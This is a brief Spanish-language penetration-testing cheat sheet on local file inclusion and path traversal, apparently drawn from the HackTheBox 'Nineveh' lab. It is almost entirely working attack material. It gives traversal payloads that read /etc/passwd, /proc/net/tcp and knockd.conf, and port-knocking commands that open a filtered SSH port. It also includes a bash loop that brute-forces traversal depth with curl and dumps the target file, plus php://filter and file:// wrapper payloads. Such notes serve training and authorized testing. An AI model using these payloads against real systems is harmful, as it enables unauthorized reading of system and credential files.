

### WHITE LIST LFI
```txt
ORIGINAL: notes=/nineveh.txt
-----------------------------------------------------------
LFI: notes=/nineveh/../../../../etc/passwd
```


# PUERTOS INTERNOS
### LFI -> IDENTIFICAR PUERTOS INTERNOS.
```shell
notes=/nineveh/../../../../proc/net/tcp
   #LOS PUERTOS INTERNOS SON EL 3 VALOR DE LO QUE NOS HA DEVUELTO, EN HEXADECIMAL
   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00                           
```

### LFI ABRIR PUERTOS INTERNOS.
```shell
#VER TODOS LOS SERVICIOS DE LOS PUERTOS INTERNOS.
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../../etc/knockd.conf

#COMPROBAMOS QUE EL PUERTO ESTE CERRADO EXTERNAMENTE
❯ sudo apt install knockd
❯ nmap -p22 10.10.10.43
22/tcp filtered ssh

#ABRIMOS EL PUERTO DE FORMA EXTERNA
❯ knock 10.10.10.43 571:tcp 290:tcp 911:tcp
❯ nmap -p22 10.10.10.43
22/tcp open  ssh
```

### SCRIPT PATH TRAVERSAL
```sh
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

### WRAPPERS
```john
page=php://filter/convert.base64-encode/resource=/etc/passwd
page=file:///etc/passwd
```